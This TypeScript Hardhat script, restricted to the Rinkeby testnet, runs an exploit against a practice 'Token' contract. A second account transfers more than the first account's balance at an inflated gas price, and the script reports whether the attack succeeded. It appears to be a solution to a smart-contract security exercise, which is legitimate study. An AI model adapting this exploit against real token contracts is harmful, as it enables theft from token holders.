import "@ethersproject/abstract-provider"
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
import { cancelLastAccountTransaction } from "./utils";
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter2,exploiter}=await getNamedAccounts()
        const exploiter2Acc= await ethers.getSigner(exploiter2)
        const token= await ethers.getContractAt('Token',process.env.TOKEN_ADDRESS as string)
        
        console.log(`Exploiter 1: ${exploiter}`)
        console.log(`Exploiter 2: ${exploiter2Acc.address}`)
        const exploiterOriginalBalance=await token.balanceOf(exploiter)
        console.log(`Original balance: ${exploiterOriginalBalance.toNumber()}`)

        //await cancelLastAccountTransaction(exploiter2Acc)}
        ///*

        const transaction = await token.connect(exploiter2Acc).transfer(exploiter,exploiterOriginalBalance.add(21),{
            gasPrice: (await ethers.provider.getGasPrice()).mul(10)
        })
        console.log(transaction.hash)
        const reciept=await transaction.wait()
        console.log(reciept)

        
        const newBalance=await token.balanceOf(exploiter)
        console.log(`New balance: ${newBalance.toNumber()}`)

        if(newBalance.gt(exploiterOriginalBalance)){
            console.log("Successful attack")
        }else{
            console.log("attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
    // */
    
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
